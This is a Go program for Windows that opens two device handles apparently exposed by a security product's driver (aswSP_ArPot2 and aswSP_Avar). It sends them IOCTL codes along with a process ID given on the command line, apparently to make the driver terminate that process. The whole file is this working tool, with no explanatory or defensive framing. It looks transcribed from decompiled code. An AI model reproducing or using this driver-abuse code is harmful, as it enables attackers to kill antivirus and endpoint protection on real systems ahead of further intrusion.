package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"unsafe"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("./device.exe pid")
		return
	}

	if os.Args[1] == "-h" {
		fmt.Println("./device.exe pid")
		return
	}

	var volumename = fmt.Sprintf("\\\\.\\aswSP_ArPot2")
	hVolume, _ := windows.CreateFile(windows.StringToUTF16Ptr(volumename), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)

	//var local_10 []byte
	var local_1c uint32
	windows.DeviceIoControl(hVolume, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)

	volumename = fmt.Sprintf("\\\\.\\aswSP_Avar")
	local_c, _ := windows.CreateFile(windows.StringToUTF16Ptr(volumename), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)

	pid, _ := strconv.Atoi(os.Args[1])
	processID := uint32(pid)
	var local_2c uint32
	windows.DeviceIoControl(local_c, 0x9988c094, (*byte)(unsafe.Pointer(&processID)), 4, nil, 0, &local_2c, nil)

	windows.CloseHandle(hVolume)
	windows.CloseHandle(local_c)

}
